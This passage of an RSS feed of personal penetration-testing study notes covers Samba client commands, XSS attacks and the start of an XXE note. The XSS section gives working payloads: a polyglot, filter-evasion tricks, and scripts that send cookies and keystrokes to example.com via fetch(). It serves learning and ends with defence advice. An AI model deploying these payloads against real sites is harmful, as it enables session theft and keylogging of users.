class=&quot;va&quot;&gt;$PORT&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;-I&lt;/code&gt; - IP address to connect to&lt;/li&gt;&lt;li&gt;&lt;code&gt;-U&lt;/code&gt; - username to use for the connection&lt;/li&gt;&lt;li&gt;&lt;code&gt;-P&lt;/code&gt; - password to use for the connection&lt;/li&gt;&lt;li&gt;&lt;code&gt;-N&lt;/code&gt; - attempt to connect without a password&lt;/li&gt;&lt;li&gt;&lt;code&gt;-W&lt;/code&gt; - domain (or workgroup) to use for the connection&lt;/li&gt;&lt;li&gt;&lt;code&gt;-p&lt;/code&gt; - connect to a non-standard port&lt;/li&gt;&lt;li&gt;&lt;code&gt;-c&lt;/code&gt; - attempt to execute the supplied command (!!!) on the server (if the user you're connecting as has permission to do so)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The -p directive is only necessary if working over a non-standard port (e.g., &lt;em&gt;not&lt;/em&gt; 445).&lt;/p&gt;&lt;p&gt;If -U is not included, smbclient will use your current (local) username, so probably best to fill something else in. If a password needs to be sent, specify the user as &lt;code&gt;${USER}%${PASSWORD}&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;The interface is reminiscent of old-school FTP clients.&lt;/p&gt;&lt;h2 id=&quot;smbget&quot;&gt;smbget&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;smbget&lt;/span&gt; smb://&lt;span class=&quot;va&quot;&gt;$IP&lt;/span&gt;/&lt;span class=&quot;va&quot;&gt;$SHARE&lt;/span&gt;/&lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt; -U &lt;span class=&quot;va&quot;&gt;$USER&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Download &lt;code&gt;$FILE&lt;/code&gt; from &lt;code&gt;$SHARE&lt;/code&gt; at &lt;code&gt;$IP&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Note that the semantics are annoyingly slightly different from smbclient - no port specification, and the &lt;code&gt;smb:&lt;/code&gt; protocol portion of the URI must be included.&lt;/p&gt;&lt;p&gt;Use -R (and omit &lt;code&gt;$FILE&lt;/code&gt;) to recursively download an entire directory.&lt;/p&gt;&lt;h2 id=&quot;net-share&quot;&gt;net share&lt;/h2&gt;&lt;p&gt;Use &lt;code&gt;net share&lt;/code&gt; on Windows to list &lt;em&gt;all&lt;/em&gt; current shares (including some that are just control processes).&lt;/p&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Working%20With%20Samba.md</guid>
		</item>
		<item>
			<title>XSS (Cross-Site Scripting) Attacks</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/XSS%20%28Cross-Site%20Scripting%29%20Attacks.md</link>
			<description>&lt;p&gt;Types of XSS attacks:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Reflected (URL-based, no server-side storage)&lt;/li&gt;&lt;li&gt;Stored&lt;/li&gt;&lt;li&gt;DOM-based (really client-side)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;DOM-based attacks are &lt;em&gt;client&lt;/em&gt; side - with both reflected and stored XSS, the server is embedding the attack into the page that's being rendered. For DOM-based attacks, it's the &lt;em&gt;client&lt;/em&gt; that inserts the malicious JavaScript into the page (even if the data was provided by the server). Ask yourself: &quot;How did this get into the page? Did the server put it there (reflected/stored XSS), or did my client put it there (DOM-based XSS)?&quot;&lt;/p&gt;&lt;p&gt;The canonical (but highly annoying) XSS PoC is:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode html&quot;&gt;&lt;code class=&quot;sourceCode html&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;alert&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&amp;#39;XSS&amp;#39;&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A much less annoying XSS test is to manipulate the &lt;code&gt;innerHTML&lt;/code&gt; of page elements:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode html&quot;&gt;&lt;code class=&quot;sourceCode html&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    xssTest&lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;querySelector&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&amp;quot;h1&amp;quot;&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-4&quot;&gt;&lt;a href=&quot;#cb2-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    xssTest&lt;span class=&quot;op&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;at&quot;&gt;innerHTML&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;XSS was here!&amp;quot;&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-5&quot;&gt;&lt;a href=&quot;#cb2-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelector&quot;&gt;Document.querySelector()&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;tips-for-writing-javascript&quot;&gt;Tips for Writing JavaScript&lt;/h2&gt;&lt;p&gt;JavaScript accepts back-ticks as a type of quotation mark, so we actually have three different marks to work with (single quote, double quote, and back-tick).&lt;/p&gt;&lt;p&gt;Sometimes you'll need to break out of a tag that you're being inserted into. Various options:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Use &lt;code&gt;&quot;&amp;gt;&lt;/code&gt; if you're being inserted into an HTML attribute.&lt;/li&gt;&lt;li&gt;Use &lt;code&gt;&amp;lt;/pre&amp;gt;&lt;/code&gt; or &lt;code&gt;&amp;lt;/textarea&amp;gt;&lt;/code&gt; for preformatted blocks and text areas.&lt;/li&gt;&lt;li&gt;Use &lt;code&gt;';&lt;/code&gt; followed by &lt;code&gt;;//&lt;/code&gt; for direct JavaScript inserts. (Note that it's only possible to insert &lt;code&gt;&amp;lt;script/&amp;gt;&lt;/code&gt; tags if the JavaScript you're abusing is being included from a file, as HTML parsers are greedy about the closing &lt;code&gt;&amp;lt;/script&amp;gt;&lt;/code&gt; tag.)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Most regular expressions and filters are only executed in a single pass. Thus, a regular expression that's filtering out &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; and &lt;code&gt;&amp;lt;/script&amp;gt;&lt;/code&gt; tags can be circumvented by using &lt;code&gt;&amp;lt;s&amp;lt;script&amp;gt;cript&amp;gt;&lt;/code&gt; and &lt;code&gt;&amp;lt;/s&amp;lt;/script&amp;gt;cript&amp;gt;&lt;/code&gt;. That said, this trick doesn't work for regular expressions that are removing single characters (for example, &lt;code&gt;&amp;lt;&lt;/code&gt; and &lt;code&gt;&amp;gt;&lt;/code&gt;).&lt;/p&gt;&lt;p&gt;You can also use the &lt;code&gt;onload&lt;/code&gt; attribute to pull in JavaScript, though note that this is only functional the first time the page is loaded. This will often require you to close out the preceding attribute (&lt;code&gt;&quot;&lt;/code&gt;) and &lt;em&gt;leave off&lt;/em&gt; the trialing &lt;code&gt;&quot;&lt;/code&gt; of the &lt;code&gt;onload&lt;/code&gt; attribute in order for everything to work properly.&lt;/p&gt;&lt;p&gt;There's also &quot;polygot&quot; strings which work in a variety of contexts. These have some pretty wild escaping going on; for example, the following (lightly modified from TryHackMe's example) produces an &quot;XSS&quot; alert:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode html&quot;&gt;&lt;code class=&quot;sourceCode html&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;jaVasCript:/*-/*`/*\`/*&amp;#39;/*&amp;quot;/**/(/* */onerror=alert(&amp;#39;XSS&amp;#39;) )//%0D%0A%0d%0a//&lt;span class=&quot;kw&quot;&gt;&amp;lt;/stYle&lt;/span&gt;&lt;span class=&quot;er&quot;&gt;/&amp;lt;/titLe/&amp;lt;/teXtarEa/&amp;lt;/scRipt/--!&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&amp;lt;sVg&lt;/span&gt;&lt;span class=&quot;er&quot;&gt;/&amp;lt;sVg/oNloAd&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;alert(&lt;/span&gt;&lt;span class=&quot;er&quot;&gt;&amp;#39;XSS&amp;#39;)/&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;/&amp;gt;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;filter-evasion&quot;&gt;Filter Evasion&lt;/h2&gt;&lt;h3 id=&quot;bypass-simple-word-filtering&quot;&gt;Bypass Simple Word Filtering&lt;/h3&gt;&lt;p&gt;In general, you can break up strings to get around this.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode javascript&quot;&gt;&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;alert&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&amp;quot;H&amp;quot;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;ello&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;eval()&lt;/code&gt; function can be used to turn strings into function names if a function is filtered.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode javascript&quot;&gt;&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span id=&quot;cb5-1&quot;&gt;&lt;a href=&quot;#cb5-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;pp&quot;&gt;eval&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&amp;quot;a&amp;quot;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;lert&amp;quot;&lt;/span&gt;)(&lt;span class=&quot;st&quot;&gt;&amp;quot;Hello&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It's also possible (and safer, though if we're breaking into things we probably care a lot less about safety) to use &lt;code&gt;window[]&lt;/code&gt;.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb6&quot;&gt;&lt;pre class=&quot;sourceCode javascript&quot;&gt;&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span id=&quot;cb6-1&quot;&gt;&lt;a href=&quot;#cb6-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;window&lt;/span&gt;[&lt;span class=&quot;st&quot;&gt;&amp;quot;a&amp;quot;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;lert&amp;quot;&lt;/span&gt;](&lt;span class=&quot;st&quot;&gt;&amp;quot;Hello&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For really heavy filtering, use something nutso like JSFuck.&lt;/p&gt;&lt;p&gt;(Note that things like the JavaScript Obfuscator Tool won't always remove functions and strings, as they tend to be geared more towards thwarting script analysis than bypassing filters.)&lt;/p&gt;&lt;p&gt;Sometimes filters are applied in a case-sensitive fashion. While JavaScript &lt;em&gt;is&lt;/em&gt; case-sensitive, URL schemes, HTML tag names, and HTML tag attributes are case-&lt;em&gt;insensitive&lt;/em&gt; (so, &lt;code&gt;javascript:&lt;/code&gt; is treated the same as &lt;code&gt;javaSCRIPT:&lt;/code&gt;, &lt;code&gt;onclick&lt;/code&gt; is treated the same as &lt;code&gt;ONCLICK&lt;/code&gt;, etc.).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;http://www.jsfuck.com/&quot;&gt;JSFuck&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://obfuscator.io/&quot;&gt;JavaScript Obfuscator Tool&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;using-iframes-and-images&quot;&gt;Using iFrames and Images&lt;/h3&gt;&lt;p&gt;Typically XSS attacks work by injecting &lt;code&gt;&amp;lt;script/&amp;gt;&lt;/code&gt; tags, but it's also possible to inject JavaScript using the &lt;code&gt;&amp;lt;iframe/&amp;gt;&lt;/code&gt; and &lt;code&gt;&amp;lt;img/&amp;gt;&lt;/code&gt; tags by setting the &lt;code&gt;src&lt;/code&gt; attribute to the &lt;code&gt;javacript:&lt;/code&gt; pseudo-protocol. For example:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb7&quot;&gt;&lt;pre class=&quot;sourceCode html&quot;&gt;&lt;code class=&quot;sourceCode html&quot;&gt;&lt;span id=&quot;cb7-1&quot;&gt;&lt;a href=&quot;#cb7-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;&amp;lt;!-- iframe injection --&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-2&quot;&gt;&lt;a href=&quot;#cb7-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;iframe&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; src=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;javascript:alert(&amp;#39;XSS&amp;#39;);&amp;quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-3&quot;&gt;&lt;a href=&quot;#cb7-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-4&quot;&gt;&lt;a href=&quot;#cb7-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;&amp;lt;!-- img injection --&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-5&quot;&gt;&lt;a href=&quot;#cb7-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;img&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; src=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;javascript:alert(&amp;#39;XSS&amp;#39;);&amp;quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Note, however, that JavaScript loaded in an &lt;code&gt;&amp;lt;iframe/&amp;gt;&lt;/code&gt; won't have access to the parent page's DOM.&lt;/p&gt;&lt;h3 id=&quot;fallbacks-requiring-user-interaction&quot;&gt;Fallbacks Requiring User Interaction&lt;/h3&gt;&lt;p&gt;Finally, &lt;code&gt;javascript:&lt;/code&gt; URIs can also be included in anchor(&lt;code&gt;&amp;lt;a/&amp;gt;&lt;/code&gt;) &lt;code&gt;href&lt;/code&gt; attributes, as well as &lt;code&gt;onmouseover&lt;/code&gt; and &lt;code&gt;onclick&lt;/code&gt; attributes (which can be attached to almost any HTML tag). Getting these attacks to fire requires a user to interact with the modified tag, however.&lt;/p&gt;&lt;h2 id=&quot;attacks&quot;&gt;Attacks&lt;/h2&gt;&lt;h3 id=&quot;accessing-browser-cookies&quot;&gt;Accessing Browser Cookies&lt;/h3&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb8&quot;&gt;&lt;pre class=&quot;sourceCode html&quot;&gt;&lt;code class=&quot;sourceCode html&quot;&gt;&lt;span id=&quot;cb8-1&quot;&gt;&lt;a href=&quot;#cb8-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-2&quot;&gt;&lt;a href=&quot;#cb8-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;fetch&lt;/span&gt;(&lt;/span&gt;
&lt;span id=&quot;cb8-3&quot;&gt;&lt;a href=&quot;#cb8-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;st&quot;&gt;&amp;#39;https://example.com/log&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-4&quot;&gt;&lt;a href=&quot;#cb8-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;            &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;?cookie=&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-5&quot;&gt;&lt;a href=&quot;#cb8-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;            &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;btoa&lt;/span&gt;(&lt;span class=&quot;bu&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;at&quot;&gt;cookie&lt;/span&gt;)&lt;/span&gt;
&lt;span id=&quot;cb8-6&quot;&gt;&lt;a href=&quot;#cb8-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    )&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-7&quot;&gt;&lt;a href=&quot;#cb8-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&quot;keylogging&quot;&gt;Keylogging&lt;/h3&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb9&quot;&gt;&lt;pre class=&quot;sourceCode html&quot;&gt;&lt;code class=&quot;sourceCode html&quot;&gt;&lt;span id=&quot;cb9-1&quot;&gt;&lt;a href=&quot;#cb9-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb9-2&quot;&gt;&lt;a href=&quot;#cb9-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;at&quot;&gt;onkeypress&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;function&lt;/span&gt;(e) {&lt;/span&gt;
&lt;span id=&quot;cb9-3&quot;&gt;&lt;a href=&quot;#cb9-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;fu&quot;&gt;fetch&lt;/span&gt;(&lt;/span&gt;
&lt;span id=&quot;cb9-4&quot;&gt;&lt;a href=&quot;#cb9-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;            &lt;span class=&quot;st&quot;&gt;&amp;#39;https://example.com/log&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb9-5&quot;&gt;&lt;a href=&quot;#cb9-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;?cookie=&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb9-6&quot;&gt;&lt;a href=&quot;#cb9-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;btoa&lt;/span&gt;(&lt;span class=&quot;bu&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;at&quot;&gt;cookie&lt;/span&gt;)&lt;/span&gt;
&lt;span id=&quot;cb9-7&quot;&gt;&lt;a href=&quot;#cb9-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;&amp;amp;keypress=&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb9-8&quot;&gt;&lt;a href=&quot;#cb9-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;btoa&lt;/span&gt;(e&lt;span class=&quot;op&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;at&quot;&gt;key&lt;/span&gt;)&lt;/span&gt;
&lt;span id=&quot;cb9-9&quot;&gt;&lt;a href=&quot;#cb9-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        )&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb9-10&quot;&gt;&lt;a href=&quot;#cb9-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    }&lt;/span&gt;
&lt;span id=&quot;cb9-11&quot;&gt;&lt;a href=&quot;#cb9-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Adding the user's session cookie here allows us to tell whose keystrokes are whose!&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/docs/Web/API/Document/cookie&quot;&gt;Document.cookie&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;port-scanning&quot;&gt;Port Scanning&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/aabeling/portscan&quot;&gt;An example JavaScript port scanner (possibly broken).&lt;/a&gt;&lt;/p&gt;&lt;h3 id=&quot;website-defacement&quot;&gt;Website Defacement&lt;/h3&gt;&lt;p&gt;You can access elements of the DOM using &lt;code&gt;document.getElementById(&quot;element-id&quot;)&lt;/code&gt; or &lt;code&gt;document.querySelector(&quot;#element-id&quot;)&lt;/code&gt;. The &lt;code&gt;querySelector()&lt;/code&gt; method is a bit more flexible (you can use CSS-style selectors here) and should probably be preferred.&lt;/p&gt;&lt;p&gt;To get/set the content of an element, use the &lt;code&gt;innerHTML&lt;/code&gt; method (to insert HTML directly into the DOM), or alternately &lt;code&gt;innerText&lt;/code&gt; or &lt;code&gt;textContent&lt;/code&gt; to set element text &lt;em&gt;only&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;Note that &lt;code&gt;&amp;lt;script/&amp;gt;&lt;/code&gt; tags inserted by setting an element's &lt;code&gt;innerHTML&lt;/code&gt; are &lt;em&gt;not&lt;/em&gt; executed, however!&lt;/p&gt;&lt;h2 id=&quot;defense&quot;&gt;Defense&lt;/h2&gt;&lt;p&gt;The key to defending against XSS is really to get your encoding right. User-generated code that's passed off to JavaScript needs to be JavaScript-escaped first. User-generated code that's written into the DOM needs to be HTML-escaped first. Know what the context is of your data, and escape/unescape appropriately when writing data from one context to another!&lt;/p&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/XSS%20%28Cross-Site%20Scripting%29%20Attacks.md</guid>
		</item>
		<item>
			<title>XXE (XML External Entity) Attacks</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/XXE%20%28XML%20External%20Entity%29%20Attacks.md</link>
			<description>&lt;p&gt;The trick with XXE attacks is that the URIs defined in an XML !DOCTYPE directive are basically just includes. This means that when an application is expecting XML input (mostly this is a thing you find over APIs), you can extend the provided DTDs in an ad hoc fashion.&lt;/p&gt;&lt;p&gt;First, an example DTD from TryHackMe:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode dtd&quot;&gt;&lt;code class=&quot;sourceCode dtd&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&amp;lt;!DOCTYPE note [&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;dt&quot;&gt;&amp;lt;!ELEMENT&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;note&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;heading&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;dt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;dt&quot;&gt;&amp;lt;!ELEMENT&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;#PCDATA&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;dt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;dt&quot;&gt;&amp;lt;!ELEMENT&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;#PCDATA&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;dt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
